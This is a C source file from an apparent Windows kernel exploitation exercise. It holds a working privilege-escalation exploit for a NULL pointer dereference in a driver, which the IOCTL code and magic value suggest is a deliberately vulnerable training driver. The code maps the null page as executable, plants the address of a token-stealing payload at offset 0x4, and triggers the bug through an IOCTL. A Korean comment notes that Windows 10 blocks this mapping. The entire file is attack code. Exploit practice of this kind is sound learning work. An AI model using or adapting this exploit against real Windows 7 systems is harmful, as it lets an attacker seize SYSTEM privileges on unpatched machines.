#include "NullPointerDereference.h"
#include "Common.h"

BOOLEAN 
MapNullPage(VOID)
{
	BOOLEAN bRetValue = FALSE;
	HMODULE hModule = NULL;
	ULONG ulRegionSize = 0x1000;
	PVOID pvBaseAddress = (PVOID)0x00000001;
	NTSTATUS status = 0;
	NTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory;

	hModule = GetModuleHandle(L"ntdll.dll");

	NtAllocateVirtualMemory = (NTALLOCATEVIRTUALMEMORY)GetProcAddress(hModule, "NtAllocateVirtualMemory");

	if (NULL == NtAllocateVirtualMemory)
	{
		goto _RET;
	}

	// Windows 10에는 할당이 NULL 영역 MAPPING이 실패한다. 보호 기법이 추가.
	status = NtAllocateVirtualMemory(
		(HANDLE)0xFFFFFFFF, 
		&pvBaseAddress, 
		0, 
		&ulRegionSize,
		MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE
	);

	if (0 != status)
	{
		goto _RET;
	}

	bRetValue = TRUE;

_RET:
	if (NULL != hModule)
	{
		FreeLibrary(hModule);
	}

	return bRetValue;
}

BOOLEAN
UnMapNullPage(VOID)
{
	BOOLEAN bRetValue = FALSE;
	HMODULE hModule = NULL;
	ULONG ulRegionSize = 0x1000;
	PVOID pvBaseAddress = (PVOID)0x00000001;
	NTFREEVIRTUALMEMORY NtFreeVirtualMemory = NULL;
	NTSTATUS status = 0;

	hModule = GetModuleHandle(L"ntdll.dll");

	NtFreeVirtualMemory = (NTFREEVIRTUALMEMORY)GetProcAddress(hModule, "NtFreeVirtualMemory");

	if (NULL == NtFreeVirtualMemory)
	{
		goto _RET;
	}

	status = NtFreeVirtualMemory(
		(HANDLE)0xFFFFFFFF,
		&pvBaseAddress,
		&ulRegionSize,
		MEM_DECOMMIT | MEM_RELEASE
	);

	if (0 != status)
	{
		goto _RET;
	}

	bRetValue = TRUE;

_RET:
	if (NULL != hModule)
	{
		FreeLibrary(hModule);
	}

	return bRetValue;
}

BOOLEAN 
NullPointerDereferenceExploitForWin7(VOID)
{
	BOOLEAN bRetValue = FALSE;
	PVOID EopPayload = &TokenStealingPayloadWin7;
	ULONG MagicValue = 0xBAADF00D;
	PVOID NullPointerPlus4 = NULL;
	PVOID NullPageBaseAddress = NULL;

	if (!MapNullPage())
	{
		goto _RET;
	}

	NullPointerPlus4 = (PVOID)((ULONG)NullPageBaseAddress + 0x4);
	*(PULONG)NullPointerPlus4 = (ULONG)EopPayload;

	bRetValue = SendIOCTL(
		NULL_POINTER_DEREFERENCE_CONTROL_CODE, 
		(PVOID)&MagicValue, 
		0
	);

	if (FALSE == bRetValue)
	{
		goto _RET;
	}

	if (!UnMapNullPage())
	{
		goto _RET;
	}

	bRetValue = TRUE;

_RET:	
	return bRetValue;
}